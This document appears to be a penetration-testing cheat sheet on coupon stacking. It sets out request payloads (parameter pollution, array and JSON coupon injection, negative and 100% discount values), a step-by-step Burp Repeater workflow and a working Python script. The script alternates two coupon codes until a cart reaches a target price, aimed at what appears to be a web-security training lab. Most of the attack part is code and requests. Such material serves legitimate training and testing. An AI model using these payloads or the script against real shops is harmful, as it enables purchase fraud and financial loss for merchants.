# Coupon / Discount Stacking

## When this applies

- Application has multiple coupon codes that should each be redeemable once.
- Server's "coupon already applied" check stores only the LAST coupon — so alternating between codes bypasses the check.
- Discount fields (`discount`, `discount_percent`, `discount_amount`) accept arbitrary values without server-side validation.

## Technique

Apply coupon A, then coupon B, then coupon A again — the "last applied" tracker resets when a different code is applied. Repeat until the cart total is acceptable.

## Steps

### Single coupon codes — discovery

```http
POST /cart/coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Common promotional codes to test
coupon=NEWCUST5
coupon=SIGNUP30
coupon=WELCOME
coupon=SAVE10
coupon=FREESHIP
coupon=VIP20
coupon=FIRST
coupon=PROMO

# Case variation testing
coupon=newcust5
coupon=NEWCUST5
coupon=NewCust5
coupon=nEwCuSt5

# Encoding variations
coupon=NEWCUST5%20
coupon=%20NEWCUST5
coupon=NEWCUST5%00
```

### Coupon stacking payloads

```http
# Parameter pollution (multiple coupons)
coupon=NEWCUST5&coupon=SIGNUP30

# Array format
coupon[]=NEWCUST5&coupon[]=SIGNUP30

# JSON format
{"coupons":["NEWCUST5","SIGNUP30"]}

# Alternating sequence (bypass consecutive check)
Request 1: coupon=NEWCUST5  ✅
Request 2: coupon=NEWCUST5  ❌ (rejected)
Request 3: coupon=SIGNUP30  ✅ (different from last)
Request 4: coupon=NEWCUST5  ✅ (different from last)
Request 5: coupon=SIGNUP30  ✅ (different from last)
# Continue alternating...
```

### Discount manipulation

```http
# Direct discount modification
discount=100  # 100% off
discount=999  # 999% (negative price?)
discount=-50  # Negative discount (price increase to manipulate logic)

# Percentage vs fixed amount
discount_percent=100
discount_amount=999999

# Multiple discount fields
discount1=30&discount2=20&discount3=10
```

### Coupon stacking workflow — 5 minutes

```plaintext
Step 1: Collect Coupons
Homepage banner: NEWCUST5
Newsletter signup: SIGNUP30

Step 2: Manual Test
Browser: Apply NEWCUST5 → Success
Browser: Apply NEWCUST5 → Error (duplicate)
Browser: Apply SIGNUP30 → Success
Browser: Apply NEWCUST5 → Success (!)

Step 3: Burp Repeater Setup
Find: POST /cart/coupon
Send to Repeater
Create Tab 1: coupon=NEWCUST5
Duplicate tab (Ctrl+Shift+R)
Create Tab 2: coupon=SIGNUP30

Step 4: Alternating Execution
Tab 1: Send (Ctrl+Space)
Tab 2: Send (Ctrl+Space)
Tab 1: Send
Tab 2: Send
... continue alternating

Step 5: Monitor Total
Browser: Refresh cart periodically
Continue until: Total < your store credit
Checkout: Complete purchase
```

### Concrete request sequence

**Request 1: Apply First Coupon**
```http
POST /cart/coupon HTTP/1.1
csrf=token1&coupon=NEWCUST5
```
Response: "Coupon applied! Total: $1,200"

**Request 2: Apply Same Coupon (Rejected)**
```http
POST /cart/coupon HTTP/1.1
csrf=token2&coupon=NEWCUST5
```
Response: "Coupon already applied"

**Request 3: Apply Different Coupon (Accepted)**
```http
POST /cart/coupon HTTP/1.1
csrf=token3&coupon=SIGNUP30
```
Response: "Coupon applied! Total: $1,050"

**Request 4: Re-apply First Coupon (Accepted!)**
```http
POST /cart/coupon HTTP/1.1
csrf=token4&coupon=NEWCUST5
```
Response: "Coupon applied! Total: $900"

Continue alternating until total is affordable.

### Python coupon stacker

```python
#!/usr/bin/env python3
import requests
import re

class CouponStacker:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set("session", session_cookie)
        self.coupons = ["NEWCUST5", "SIGNUP30"]

    def get_csrf_token(self):
        response = self.session.get(f"{self.base_url}/cart")
        match = re.search(r'name="csrf" value="([^"]+)"', response.text)
        return match.group(1) if match else None

    def apply_coupon(self, coupon_code):
        url = f"{self.base_url}/cart/coupon"
        data = {
            "csrf": self.get_csrf_token(),
            "coupon": coupon_code
        }
        response = self.session.post(url, data=data)
        if "already applied" in response.text.lower():
            return False
        elif "applied" in response.text.lower():
            return True
        return None

    def get_cart_total(self):
        response = self.session.get(f"{self.base_url}/cart")
        match = re.search(r'\$([0-9,]+\.[0-9]{2})', response.text)
        if match:
            total_str = match.group(1).replace(',', '')
            return float(total_str)
        return None

    def stack_coupons(self, target_total):
        current_total = self.get_cart_total()
        print(f"[*] Starting total: ${current_total}")
        print(f"[*] Target total: ${target_total}")

        coupon_index = 0
        attempts = 0
        max_attempts = 100

        while current_total > target_total and attempts < max_attempts:
            coupon = self.coupons[coupon_index]
            print(f"[*] Applying coupon: {coupon}")

            result = self.apply_coupon(coupon)
            if result:
                new_total = self.get_cart_total()
                print(f"[+] Applied! New total: ${new_total}")
                current_total = new_total
                coupon_index = (coupon_index + 1) % len(self.coupons)
            elif result is False:
                print(f"[-] Coupon rejected, switching...")
                coupon_index = (coupon_index + 1) % len(self.coupons)
            else:
                print(f"[!] Unknown response, switching...")
                coupon_index = (coupon_index + 1) % len(self.coupons)

            attempts += 1

        final_total = self.get_cart_total()
        print(f"\n[*] Final total: ${final_total}")
        if final_total <= target_total:
            print("[+] Target reached! Proceed to checkout.")
        else:
            print("[-] Could not reach target total.")

stacker = CouponStacker(
    base_url="https://lab-id.web-security-academy.net",
    session_cookie="your_session_cookie_here"
)
stacker.stack_coupons(target_total=100)
```

## Verifying success

- Cart total decreases on each successful coupon application.
- Same coupon code is accepted multiple times (after another code is interleaved).
- Final checkout completes at the deeply discounted price.

## Common pitfalls

- Some apps record EVERY applied coupon (set, not last) — alternating won't help; try array/JSON injection.
- CSRF tokens may be single-use — fetch a fresh token before each apply.
- Some apps cap total discount at 90% — you may stop short of free.

## Tools

- Burp Suite Repeater (multi-tab alternating sends)
- Python `requests`
- curl
